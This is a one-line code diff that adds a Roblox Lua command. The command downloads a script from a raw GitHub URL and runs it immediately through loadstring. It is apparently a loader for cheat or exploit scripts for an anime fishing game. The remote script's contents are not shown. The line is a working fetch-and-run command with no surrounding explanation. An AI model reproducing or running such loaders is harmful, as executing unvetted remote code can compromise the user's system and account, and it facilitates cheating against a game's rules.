@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/fish-an-anime-rng-spam4-a2y9rafdhi0f6b.lua"))()
